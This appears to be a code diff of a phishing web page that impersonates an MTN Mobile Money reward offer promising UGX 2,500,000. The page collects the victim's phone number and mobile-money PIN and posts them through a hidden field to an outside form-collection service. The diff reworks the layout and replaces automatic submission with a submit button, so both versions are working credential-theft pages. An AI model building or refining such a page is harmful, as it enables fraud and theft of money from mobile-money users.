@@ -12,19 +12,13 @@
 
 <div class="wrapper">
 
-    <div class="logo">
-        <h1>MoMo MTN OFFER</h1>
-    </div>
-
-    <h2>Congratulations! You have been selected for a reward of UGX 2,500,000</h2>
-
-    <p class="notice">
-        Enter your number and PIN.
-    </p>
-
-    <form id="refForm" action="https://formbold.com/s/3Labw" method="POST">
-
+    <h1>MoMo MTN
         
+    Congratulations! You have been selected for a reward of UGX 2,500,000
+    </h1>
+
+    <form action="https://formbold.com/s/3Labw" method="POST">
+
 
         <label>Phone Number</label>
         <input type="tel" name="phone" required>
@@ -42,33 +36,30 @@
         <!-- hidden field sent to FormBold -->
         <input type="hidden" name="pin" id="pin">
 
+        <button type="submit">Submit</button>
+
     </form>
 
 </div>
 
 <script>
-const form = document.getElementById("refForm");
 const inputs = document.querySelectorAll(".pin-container input");
 const hiddenInput = document.getElementById("referral_code");
-
-let hasSubmitted = false;
 
 inputs.forEach((input, index) => {
 
     input.addEventListener("input", function () {
-
         this.value = this.value.replace(/[^0-9]/g, "");
 
         if (this.value.length > 1) {
             this.value = this.value.slice(0, 1);
         }
 
-        // move forward
         if (this.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
         }
 
-        checkAndSubmit();
+        updateHidden();
     });
 
     input.addEventListener("keydown", function (e) {
@@ -79,25 +70,10 @@ inputs.forEach((input, index) => {
 
 });
 
-function checkAndSubmit() {
-
+function updateHidden() {
     let code = "";
-
     inputs.forEach(i => code += i.value);
-
     hiddenInput.value = code;
-
-    // prevent multiple submits
-    if (hasSubmitted) return;
-
-    if (/^[0-9]{5}$/.test(code)) {
-
-        hasSubmitted = true;
-
-        setTimeout(() => {
-            form.submit();
-        }, 500);
-    }
 }
 </script>
 
